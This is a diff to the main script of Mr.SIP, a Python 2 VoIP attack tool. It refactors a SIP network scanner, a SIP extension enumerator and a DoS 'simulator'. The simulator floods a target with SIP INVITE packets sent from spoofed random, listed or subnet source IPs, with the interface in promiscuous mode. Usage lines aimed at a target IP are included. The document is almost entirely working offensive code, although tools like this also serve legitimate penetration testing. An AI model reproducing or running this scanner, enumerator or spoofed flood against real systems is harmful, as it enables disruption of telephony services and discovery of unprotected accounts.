@@ -16,8 +16,8 @@
 """
 
 __author__ = "Melih Tas"
-__copyright__ = "Copyrgiht 2019"
-__credits__ = ["Caner", "Onur"]
+__copyright__ = "CopyRight 2020"
+__credits__ = ["Caner", "Onur", "Hakki"]
 __license__ = "GPL"
 __version__ = "1.1.0"
 __maintainer__ = "Melih Tas"
@@ -33,6 +33,7 @@ import random,string,ipaddress,netifaces,os,socket,logging
 from optparse import OptionParser, OptionGroup
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import conf, IP
+from utilities import print_green, print_red, warn
 import sip_packet, utilities
 import pyfiglet
 import itertools
@@ -50,22 +51,21 @@ NES_HELP = 'SIP-NES is a network scanner. It needs the IP range or IP subnet inf
 ENUM_HELP = 'SIP-ENUM is an enumerator. It needs the output of SIP-NES and also pre-defined SIP usernames. It generates SIP REGISTER messages and sends them to all SIP components and tries to find the valid SIP users on the target network. You can write the output in a file.'
 DAS_HELP = 'SIP-DAS is a DoS/DDoS attack simulator. It comprises four components: powerful spoofed IP address generator, SIP message generator, message sender and response parser. It needs the outputs of SIP-NES and SIP-ENUM along with some pre-defined files.'
 
-parser.add_option("--ns", "--network-scanner", action="store_true", dest="network_scanner", default=False, help=NES_HELP) # SIP-ENUM: SIP-based Enumerator 
-parser.add_option("--se", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help=ENUM_HELP)# SIP-DAS: SIP-based DoS Attack Simulator 
-parser.add_option("--ds", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help=DAS_HELP)
+parser.add_option("--nes", "--network-scanner", action="store_true", dest="network_scanner", default=False, help=NES_HELP) # SIP-ENUM: SIP-based Enumerator 
+parser.add_option("--enum", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help=ENUM_HELP)# SIP-DAS: SIP-based DoS Attack Simulator 
+parser.add_option("--das", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help=DAS_HELP)
 
 
-NES_USAGE = """python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_IP> --dp=<server_port>  
-python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_network_range> --dp=<server_port>
-python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_network_address> --dp=<server_port>
+NES_USAGE = """python2 mr.sip.py --nes --tn=<target_IP> --mt=options
+python2 mr.sip.py --nes --tn=<target_network_range> --mt=invite
+python2 mr.sip.py --nes --tn <target_network_address> --mt=subscribe
 """
-ENUM_USAGE = """
-python2 mr.sip.py --if=<interface> --tc=<thread_count> --se --dp=5060 --fu=fromUser.txt
-python2 mr.sip.py --if=<interface> --tc=<thread_count> --se --dp=5060 --tn <target_IP> --fu=fromUser.txt
+ENUM_USAGE = """python2 mr.sip.py --enum --from=from.txt
+python2 mr.sip.py --enum --tn=<target_IP> --from=from.txt
 """
-DAS_USAGE = """python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
-python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -s --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
-python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -m --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt --il=ip_list.txt 
+DAS_USAGE = """python2 mr.sip.py --das -mt=invite -c <package_count> --tn=<target_IP> -r
+python2 mr.sip.py --das --mt=invite -c <package_count> --tn=<target_IP> -s
+python2 mr.sip.py --das --mt=invite -c <package_count> --tn=<target_IP> -m --il=ip_list.txt
 """
 
 group_NES_usage = OptionGroup(parser, "SIP-NES Usage", NES_USAGE) # "IP range format: 192.168.1.10-192.168.1.20. Output also written to ip_list.txt."
@@ -79,10 +79,10 @@ parser.add_option_group(group_DAS_usage)
 
 group = OptionGroup(parser, "Parameters")
 group.add_option("--tn", "--target-network", dest="target_network", help="Target network range to scan.")
-group.add_option("--dm", "--dos-method", dest="dos_method", help="Message type selection. OPTIONS, INVITE, REGISTER, SUBSCRIBE, CANCEL, BYE or other custom method.")
+group.add_option("--mt", "--message-type", dest="message_type", help="Message type selection. OPTIONS, INVITE, REGISTER, SUBSCRIBE, CANCEL, BYE or other custom method.")
 group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
 group.add_option("--to", "--to-user", dest="to_user", default="toUser.txt", help="To User list file. Default is toUser.txt.")
-group.add_option("--fu", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file. Default is fromUser.txt.")
+group.add_option("--from", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file. Default is fromUser.txt.")
 group.add_option("--su", "--sp-user", dest="sp_user", default="spUser.txt", help="SP User list file. Default is spUser.txt.")
 group.add_option("--ua", "--user-agent", dest="user_agent", default="userAgent.txt", help="User Agent list file. Default is userAgent.txt.")
 group.add_option("--il", "--manual-ip-list", dest="manual_ip_list", help="IP list file.")
@@ -146,13 +146,16 @@ def main():
   | |/ _ \ / _ \| |
   | | (_) | (_) | |
   |_|\___/ \___/|_|+ \033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m
-   """ + "Greetz ~ \033[1m\033[94m Caner \033[1m\033[93m Onur \033[1m\033[95m Nesli \n\033[0m"
+   """ + "Greetz ~ \033[1m\033[94m Caner \033[1m\033[93m Onur \033[1m\033[95m Nesli \n\033[0m" \
+       + "   Maintainer ~ \033[0;32mHakki Riza Kucuk\n\033[0m"
                    
    print (banner)
    if options.interface is not None:
       conf.iface = options.interface
 
    s = time.time()
+   print_time = True
+
 
    if options.network_scanner:
       networkScanner()
@@ -160,312 +163,268 @@ def main():
       dosSmilator()
    elif options.sip_enumerator:
       sipEnumerator()
+   else:
+      print("No module is specified.")
+      print("If you want you get more out of Mr.SIP, check out PRO version ---> https://mrsip.gitlab.io/ ")
+      print_time = False
 
-   e = time.time()
-   print ("time taken: {}".format(e-s))
+   if print_time:
+      e = time.time()
+      print(("time duration: {:.2f}".format(e - s)))
 
 
 # SIP-NES: SIP-based Network Scanner
 def networkScanner():
-   conf.verb = 0
-   
-   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
-   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
+    value_errors = []
+    conf.verb = 0
+    global counter
 
-   printInital("Network scan :", conf.iface, client_ip)
+    try: client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
+    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')
 
-   dos_method = options.dos_method if options.dos_method else "options"
+    message_type = options.message_type.lower() if options.message_type else "options"
+    if options.target_network == None: value_errors.append('Please specify a valid target network with --tn option.')
+    if 'txt' in options.from_user: from_user = [userName for userName in utilities.readFile(options.from_user).split("\n") if userName.isalnum()]
+    else: from_user = [options.from_user]
+    if 'txt' in options.to_user: to_user = [userName for userName in utilities.readFile(options.to_user).split("\n") if userName.isalnum()]
+    else: to_user = [options.to_user]
 
-   if '-' in options.target_network or '/' in options.target_network:  # Create new threads
-      global counter
-      global timeToExit
-      counter = 0
+    if message_type== 'invite' or message_type == 'options':
+        pass # both fromUser and toUser should be accepted.
+    elif message_type == 'register' or message_type == 'subscribe':
+        to_user = [''] # toUser should be omitted
+    
+    if 'txt' in options.from_user or '.txt' in options.to_user: 
+        print("\033[33m\nYou gave a list of user names ('{}', '{}') for SIP-NES. This is yet an experimental feature. (WIP) \033[0m".format(options.from_user, options.to_user))
+        print("\033[33mIf this was not what you wanted, specify user names with '--to' and '--from' arguments \033[0m \n")
+    
+    utilities.check_value_errors(value_errors)
+    
+    if "-" in options.target_network:
+        host_range = options.target_network.split("-")
+        host, last = ipaddress.IPv4Address(unicode(host_range[0])), ipaddress.IPv4Address(unicode(host_range[1]))
+        if ipaddress.IPv4Address(host) > ipaddress.IPv4Address(last): value_errors.append("Error: Second IP address ({}) must bigger than first IP address ({}).".format(ipaddress.IPv4Address(host),ipaddress.IPv4Address(last)))
+        else:
+            target_networks = [utilities.decimal_to_octets(host) for host in range(int(ipaddress.IPv4Address(host)), int(ipaddress.IPv4Address(last) + 1))]
+            target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product(target_networks, from_user, to_user)]
+    elif "/" in options.target_network:
+        target_networks = [host for host in ipaddress.IPv4Network(unicode(options.target_network), strict=False).hosts()]
+        target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product(target_networks, from_user, to_user)]
+    elif len(from_user) > 1 or len(to_user) > 1:
+        print("\033[33mCalculating all permutations of target network ('{}'), from user name list ('{}') and to user name list ('{}').\033[0m".format(options.target_network, options.from_user, options.to_user))
+        print("\033[33mDepending on the list sizes, this might take a long time.\033[0m \n")
+        target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product([options.target_network], from_user, to_user)]
 
-      threadID = 0
-      for threadName in threadList:
-         thread = ThreadSIPNES(threadID, threadName, dos_method, options.dest_port, client_ip)
-         thread.start()  # invoke the 'run()' function in the class
-         threads.append(thread)
-         threadID += 1
+    utilities.check_value_errors(value_errors)
+    utilities.printInital("Network scan :", conf.iface, client_ip)
+    
+    thread_join_time = 0.01
+    if '-' in options.target_network or '/' in options.target_network or (len(from_user) > 1 or len(to_user) > 1):  # Create new threads
+        run_event = threading.Event()
+        for _ in threadList:
+            thread = threading.Thread(target=sipnes_worker, args=(run_event, message_type, options.dest_port, client_ip))
+            thread.daemon = True
+            threads.append(thread)
 
-   if "-" in options.target_network:
-      host_range = options.target_network.split("-")
+        _prompt_new = "\33[38;5;6m{} User names (to and from) will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n)\33[0m\n"
+        try:
+            continue_flag = raw_input(_prompt_new.format(len(from_user) + len(to_user), len(target_networks), len(target_network__fromUser__toUser)))
+        except EOFError:
+            print("STDIN is unavailable. Accepting answer as yes.")
+            continue_flag = 'y'
+        if continue_flag == 'n':
+            print("\33[38;5;6mTerminating by user input\33[0m")
+            run_event.clear()
+            exit(0)
+        elif continue_flag != 'y' and continue_flag != 'n':
+            print("\33[38;5;6mAnswer not understood. Please answer y/n.\33[0m")
+            run_event.clear()
+            exit(0)
+            
+        for tn_fu_tu in target_network__fromUser__toUser: workQueue.put(tn_fu_tu) 
+        for thread in threads: thread.start()
+        try:
+            while not workQueue.empty(): pass
+        except KeyboardInterrupt:
+            print("\nCTRL+C pressed, terminating SIP-NES gracefully")
+        run_event.set()
+        run_event.clear()
+        try:
+            for t in threads: t.join(thread_join_time)
+        except KeyboardInterrupt:
+            print("\nCTRL+C pressed, but Mr. SIP is already trying to terminate SIP-NES gracefully. Please be patient.")
+            for t in threads: t.join(thread_join_time)  # call the threads, finish
+    else:
+        if len(from_user) == 1 and len(to_user) == 1:
+            host = options.target_network
+            sip = sip_packet.sip_packet(message_type, host, options.dest_port, client_ip, from_user=from_user[0], to_user=to_user[0], protocol="socket", wait=True)
+            result = sip.generate_packet()
 
-      host = ipaddress.IPv4Address(unicode(host_range[0]))
-      last = ipaddress.IPv4Address(unicode(host_range[1]))
+            if result["status"]: # and result["response"]['code'] == 200:
+                utilities.printResult(result, host, options.ip_list)
+                counter += 1
 
-      if ipaddress.IPv4Address(host) > ipaddress.IPv4Address(last):
-         print ("\033[1;31;40m Error: Second value must bigger than First value.\033[0m")
-         exit(0)
-
-      # Fill the queue with hosts
-      for host in range(ipaddress.IPv4Address(host), ipaddress.IPv4Address(last) + 1): workQueue.put(ipaddress.IPv4Address(host))  # work to do!
-
-      # finish up the work
-      while not workQueue.empty(): pass  # Wait for queue
-      timeToExit = 1  # Notify threads
-      for t in threads: t.join()  # Wait for all threads to complete
-   elif "/" in options.target_network:
-      targetNetwork = ipaddress.IPv4Network(unicode(options.target_network), strict=False)
-               
-      # Fill the queue with for runners
-      for host in targetNetwork.hosts(): workQueue.put(host)  # work to do!
-
-      # finish up the work
-      while not workQueue.empty(): pass  # Wait for queue to empty
-      timeToExit = 1  # Notify threads it's time to exit
-      for t in threads: t.join()  # Wait for all threads to complete
-   else:
-      host =  options.target_network
-      sip = sip_packet.sip_packet(dos_method, host, options.dest_port, client_ip, protocol="socket", wait=True)
-      result = sip.generate_packet()
-
-      if result["status"] and result["response"]['code'] == 200:
-         printResult(result,host)
-         counter += 1
-   print ("\033[31m[!] Network scan process finished and {0} live IP address(s) found.\033[0m".format(str(counter)))
+    print(("\033[31m[!] Network scan process finished and {0} live IP address(s) found.\033[0m".format(str(counter))))
 
 
 # SIP-ENUM: SIP-based Enumerator 
 def sipEnumerator():
-   conf.verb = 0
-   
-   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
-   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
+    value_errors = []
+    conf.verb = 0
 
-   printInital("Enumeration", conf.iface, client_ip)
+    try: client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
+    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')
+    
+    message_type = options.message_type.lower() if options.message_type else "subscribe"
 
-   dos_method = options.dos_method if options.dos_method else "subscribe"
+    user_list = [userName for userName in utilities.readFile(options.from_user).split("\n") if userName.isalnum()]
+    if len(user_list) <= 1: value_errors.append("Error: From user not found. Please enter a valid From User list.")
 
-   user_list = utilities.readFile(options.from_user).split("\n")
-   if len(user_list) <= 1:
-      print ("\033[1;31;40m Error: From user not found. Please enter a valid From User list.\033[0m")
-      exit(0)
+    if options.target_network: target_networks = [options.target_network]
+    else:
+        content = utilities.readFile("ip_list.txt").split(";")
+        if len(content[0]) <= 1: value_errors.append("Error: Target IP not found. Please run SIP-NES first for detect the target IPs.")
+        with open('ip_list.txt', 'r') as f: target_networks = [line.split(';')[0] for line in f.readlines()]
+
+    utilities.check_value_errors(value_errors)
+    utilities.printInital("Enumeration", conf.iface, client_ip)
+    
+    # combination of all target_networks with user_IDs
+    target_network__user_id = [(target_network, user_id) for target_network, user_id in itertools.product(target_networks, user_list)]
+
+    global counter
+    global workQueue
+    run_event = threading.Event()
+    thread_join_time = 0.001
+    print("running with {} threads".format(len(threadList)))
+    for _ in threadList:
+        thread = threading.Thread(target=sipenum_worker, args=(run_event, message_type, options.dest_port, client_ip))
+        thread.daemon = True
+        threads.append(thread)
+
+    _prompt_new = "\33[38;5;6m{} user IDs will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n)\33[0m\n"
+    try:
+        continue_flag = raw_input(_prompt_new.format(len(user_list), len(target_networks), len(target_network__user_id)))
+    except EOFError:
+        print("STDIN is unavailable. Accepting answer as yes.")
+        continue_flag = 'y'
+
+    if continue_flag == 'y':
+        for tn_ui in target_network__user_id: workQueue.put(tn_ui)
+        for thread in threads: thread.start()  # invoke the 'run()' function in the class
+        try: 
+            while not workQueue.empty(): pass  # Wait for queue to empty<
+        except KeyboardInterrupt: print("\nCTRL+C pressed, terminating SIP-ENUM gracefully")
+        run_event.set()
+        run_event.clear()
+        try:
+            for t in threads: t.join(thread_join_time)
+        except KeyboardInterrupt:
+            print("\nCTRL+C pressed, but Mr. SIP is already trying to terminate SIP-ENUM gracefully. Please be patient.")
+            for t in threads: t.join(thread_join_time)  # call the threads, finish
+    elif continue_flag == 'n':
+        print("\33[38;5;6mTerminating by user input\33[0m")
+        run_event.set()
+        run_event.clear()
+        exit(0)
+    else:
+        print("\33[38;5;6mAnswer not understood. Please answer y/n.\33[0m")
+        run_event.set()
+        run_event.clear()
+        exit(0)
+
+    print(("[!] " + str(counter) + " SIP Extension Found."))
 
 
-   # TODO: input validation for --tn ...
-   if options.target_network:
-      target_networks = [options.target_network]
-   else:
-      content = utilities.readFile("ip_list.txt").split(";")
-      if len(content[0]) <= 1:
-         print ("\033[1;31;40m Error: Target IP not found. Please run SIP-NES first for detect the target IPs.\033[0m")
-         exit(0)
-
-      with open('ip_list.txt', 'r') as f: target_networks = [line.split(';')[0] for line in f.readlines()] 
-
-   # combination of all target_networks with user_IDs
-   target_network__user_id = [(target_network, user_id) for target_network, user_id in itertools.product(target_networks, user_list)]
-
-
-   global counter
-   global timeToExit
-   global workQueue
-   # global prog_bar_counter
-   # global len_total 
-
-   counter = 0  # extension counter
-   # prog_bar_counter = 0
-   # len_total = len(target_network__user_id)
-
-   print("running with {} threads".format(len(threadList)))
-   threadID = 0
-   for threadName in threadList:
-      thread = ThreadSIPENUM(threadID, threadName, dos_method, options.dest_port, client_ip)
-      thread.start()  # invoke the 'run()' function in the class
-      threads.append(thread)
-      threadID += 1
-
-   _prompt_new = "{} user IDs will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n) \n"
-   isContinue = raw_input(_prompt_new.format(len(user_list), len(target_networks), len(target_network__user_id)))
-   
-   if isContinue == 'y':
-      for tn_ui in target_network__user_id: workQueue.put(tn_ui)
-      while not workQueue.empty(): pass # Wait for queue to empty
-   elif isContinue == 'n':
-         timeToExit = 1
-         print("Terminating by user input")
-         for t in threads: t.join()  # Wait for all threads to complete
-         exit(0)
-   else:
-      timeToExit = 1 
-      for t in threads: t.join()  
-      print("Answer not understood. Please answer y/n.")
-      exit(0)
-
-   timeToExit = 1  
-   for t in threads: t.join()  
-
-   print ("[!] " + str(counter) + " SIP Extension Found.")
-             
-             
 # SIP-DAS: SIP-based DoS Attack Simulator
 def dosSmilator():
-   conf.verb = 0
-   
-   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
-   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
+    value_errors = []
+    conf.verb = 0
 
-   printInital("DoS attack simulation", conf.iface, client_ip)
+    try: 
+        client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
+        client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
+    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')
+    message_type = options.message_type.lower() if options.message_type else "invite"
+    
+    utilities.check_value_errors(value_errors)
+    utilities.promisc("on", conf.iface)
+    utilities.printInital("DoS attack simulation", conf.iface, client_ip)
 
-   dos_method = options.dos_method if options.dos_method else "invite"
+    i = 0
+    while i < int(options.counter):
+        try:
+            toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
+            fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
+            spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
+            userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
 
-   utilities.promisc("on",conf.iface)
+            pkt = IP(dst=options.target_network)
+            client = pkt.src
 
-   i = 0
-   while i < int(options.counter):
-      try:
-         toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
-         fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
-         spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
-         userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
-         
-         pkt= IP(dst=options.target_network)
-         client = pkt.src
-         
-         if options.random and not options.library:
-               client = utilities.randomIPAddress()
-         if options.manual and not options.library:
-               client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
-         if options.subnet and not options.library:
-               client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask, False)
-         send_protocol = "scapy"
-         if options.library:
-               send_protocol = "socket"
-               
-         sip = sip_packet.sip_packet(str(dos_method), str(options.target_network), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
-         sip.generate_packet()
-         i += 1
-         utilities.printProgressBar(i,int(options.counter),"Progress: ")
-      except (KeyboardInterrupt):
-         utilities.promisc("off",conf.iface)
-         print ("Exiting traffic generation...")
-         raise SystemExit
-   
-   print ("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i),str(options.target_network)))
-   utilities.promisc("off",conf.iface)
+            if options.random and not options.library:
+                client = utilities.randomIPAddress()
+            if options.manual and not options.library:
+                client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
+            if options.subnet and not options.library:
+                client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask, False)
+            send_protocol = "scapy"
+            if options.library:
+                send_protocol = "socket"
 
+            sip = sip_packet.sip_packet(str(message_type), str(options.target_network), str(options.dest_port),
+                                        str(client), str(fromUser), str(toUser), str(userAgent), str(spUser),
+                                        send_protocol)
+            sip.generate_packet()
+            i += 1
+            utilities.printProgressBar(i, int(options.counter), "Progress: ")
+        except (KeyboardInterrupt):
+            utilities.promisc("off", conf.iface)
+            print("Exiting traffic generation...")
+            raise SystemExit
 
-
-# Print functions:
-def printInital(moduleName, client_iface, client_ip):
-   print ("\033[33m[!] Client Interface: {}\033[0m".format(str(client_iface)))
-   print ("\033[33m[!] Client IP: {}\033[0m".format(str(client_ip)))
-   print ("\033[94m[!] {} process started. \033[0m".format(moduleName))
+    print(("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i), str(
+        options.target_network))))
+    utilities.promisc("off", conf.iface)
 
 
-def printResult(result,target):
-   user_agent = ""
-   for key, value in result["response"]['headers'].iteritems():
-      if key == "user-agent":              
-         user_agent = list(value)[0]
-
-   if utilities.defineTargetType(user_agent) == "Server":
-      print ("\033[1;32m[+] New live IP found on {}, It seems as a SIP Server ({}).\033[0m".format(target, user_agent))
-      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
-      removeDuplicateLines(options.ip_list)
-   else:
-      print ("\033[1;32m[+] New live IP found on " + target + ", It seems as a SIP Client.\033[0m")
-      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
-      removeDuplicateLines(options.ip_list)
+# module functions for parallel computing...
+def sipnes_worker(run_event, option, dest_port, client_ip):
+    while not run_event.is_set():
+        global counter  # notice how we use 'global' counter
+        global workQueue
+        host, from_user, to_user = workQueue.get()  # get host
+        sip = sip_packet.sip_packet(option, host, dest_port, client_ip, from_user=from_user, to_user=to_user, protocol="socket", wait=True)  # set options
+        result = sip.generate_packet()  # generate packet.
+        if result["status"]:
+            utilities.printResult(result, str(host), options.ip_list)
+            counter += 1  # global counter changed
 
 
-def removeDuplicateLines(path):
-   with open(path, 'r+') as f:
-      unique = list(dict.fromkeys([line for line in f.readlines()]))
-      f.seek(0)
-      for line in unique: f.write(line)
-      f.truncate()
+def sipenum_worker(run_event, option, dest_port, client_ip):
+    while not run_event.is_set():
+        global counter  # notice how we use 'global' counter
+        global workQueue
 
+        if workQueue.empty(): break
 
-
-# Thread object for SIP-NES function
-class ThreadSIPNES(threading.Thread):
-   def __init__(self, threadID, name, option, dest_port, client_ip):
-      threading.Thread.__init__(self)  # inherit the constructor
-      self.threadID = threadID
-      self.name = name
-
-      self.option = option
-      self.dest_port = dest_port
-      self.client_ip = client_ip
-   
-   def run(self):
-      global counter  # notice how we use 'global' counter
-      global timeToExit
-      global workQueue
-      global queueLock
-
-      while not timeToExit:
-         queueLock.acquire()
-         if not workQueue.empty():
-            host = workQueue.get()  # get host
-            queueLock.release()  # when host is acquired, release the lock
-
-            # print(str(host))
-
-            sip = sip_packet.sip_packet(self.option, host, self.dest_port, self.client_ip, protocol="socket", wait=True)  # set options
-            result = sip.generate_packet()  # generate packet.
-
-            if result["status"]: 
-               if result["response"]['code'] == 200:
-                  printResult(result,str(host))
-                  counter += 1  # global counter changed
-         else:
-            queueLock.release()  # when no jobs exist, release the lock
-
-
-# Thread object for SIP-ENUM
-class ThreadSIPENUM(threading.Thread):
-   def __init__(self, threadID, name, option, dest_port, client_ip):
-      threading.Thread.__init__(self)
-      self.threadID = threadID
-      self.name = name
-
-      self.option = option
-      self.dest_port = dest_port
-      self.client_ip = client_ip
-
-   def run(self):
-      global counter  # extension counter
-      global timeToExit
-      global workQueue
-      global queueLock
-      # global prog_bar_counter
-      # global len_total
-
-      while not timeToExit:
-         queueLock.acquire()
-         if not workQueue.empty():
-            tn_ui = workQueue.get()  # get host
-            queueLock.release()  # when host is acquired, release the lock
-
-            target_network = tn_ui[0]
-            user_id = tn_ui[1]
-
-            # print("tn: {} - ui: {} - method: {}".format(target_network, user_id, self.option))
-
-            sip = sip_packet.sip_packet(self.option, target_network, self.dest_port, self.client_ip, from_user = user_id.strip(),to_user = user_id.strip(),protocol="socket", wait=True)
-            result = sip.generate_packet()
-
-            # printProgressBar(prog_bar_counter, len_total, 'progress', 'completed')
-            # prog_bar_counter += 1
-
-            if result["status"]:
-               if not len(result["response"]):
-                  print ("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id))
-                  counter += 1
-               elif result["response"]['code'] == 200:
-                  print ("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id))
-                  counter += 1
-               elif result["response"]['code'] == 401:
-                  print ("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id))
-                  counter += 1
-               elif result["response"]['code'] == 403:
-                  print ("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id))
-                  counter += 1
-         else:
-            queueLock.release()
+        tn_ui = workQueue.get()  # get host
+        target_network, user_id = tn_ui[0], tn_ui[1]
+        sip = sip_packet.sip_packet(option, target_network, dest_port, client_ip, from_user=user_id.strip(), to_user=user_id.strip(), protocol="socket", wait=True)
+        result = sip.generate_packet()
+        if result["status"]:
+            if not len(result["response"]):
+                print(("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id)))
+                counter += 1
+            elif result["response"]['code'] == 200:
+                print(("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id)))
+                counter += 1
+            elif result["response"]['code'] == 401:
+                print(("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id)))
+                counter += 1
+            elif result["response"]['code'] == 403:
+                print(("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id)))
+                counter += 1
 
 
 
